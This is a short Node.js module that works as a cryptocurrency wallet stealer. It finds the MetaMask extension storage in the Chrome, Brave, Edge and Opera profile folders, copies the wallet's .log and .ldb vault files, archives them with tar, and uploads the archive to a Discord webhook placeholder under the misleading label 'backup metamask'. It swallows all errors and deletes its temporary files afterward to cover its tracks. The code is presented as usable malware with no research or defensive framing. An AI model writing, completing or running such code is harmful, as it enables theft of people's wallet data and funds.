const fs = require('fs')
const path = require('path')
const os = require('os')
const axios = require('axios')
const FormData = require('form-data')
const { execSync } = require('child_process')

const webhook = 'webhook here'

async function metamask() {
  const usuario = os.homedir()
  const extensoes = [
    { nome: 'chrome', pasta: path.join(usuario, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings', 'nkbihfbeogaeaoehlefnkodbefgpgknn') },
    { nome: 'brave', pasta: path.join(usuario, 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Extension Settings', 'nkbihfbeogaeaoehlefnkodbefgpgknn') },
    { nome: 'edge', pasta: path.join(usuario, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Extension Settings', 'nkbihfbeogaeaoehlefnkodbefgpgknn') },
    { nome: 'opera', pasta: path.join(usuario, 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Local Extension Settings', 'nkbihfbeogaeaoehlefnkodbefgpgknn') }
  ]

  for (const ext of extensoes) {
    if (!fs.existsSync(ext.pasta)) continue
    const arquivos = fs.readdirSync(ext.pasta).filter(a => a.endsWith('.log') || a.endsWith('.ldb'))
    if (!arquivos.length) continue

    const temp_dir = path.join(os.tmpdir(), 'metamask_' + ext.nome)
    if (!fs.existsSync(temp_dir)) fs.mkdirSync(temp_dir, { recursive: true })

    arquivos.forEach(arquivo => {
      try {
        fs.copyFileSync(path.join(ext.pasta, arquivo), path.join(temp_dir, arquivo))
      } catch {}
    })

    const zip = path.join(os.tmpdir(), `metamask_${ext.nome}.zip`)
    try {
      execSync(`tar -zcf "${zip}" -C "${temp_dir}" .`)
    } catch { continue }

    const form = new FormData()
    form.append('file', fs.createReadStream(zip), `metamask_${ext.nome}.zip`)
    form.append('payload_json', JSON.stringify({
      embeds: [{
        title: 'MetaMask',
        description: `backup metamask (${ext.nome})`,
        color: 0xf6851b,
        footer: { text: 'discord.gg/npm' }
      }]
    }))

    try {
      await axios.post(webhook, form, { headers: form.getHeaders() })
    } catch {}

    try {
      if (fs.existsSync(zip)) fs.unlinkSync(zip)
      if (fs.existsSync(temp_dir)) {
        fs.readdirSync(temp_dir).forEach(f => {
          fs.unlinkSync(path.join(temp_dir, f))
        })
        fs.rmdirSync(temp_dir)
      }
    } catch {}
  }
}

module.exports = { metamask }
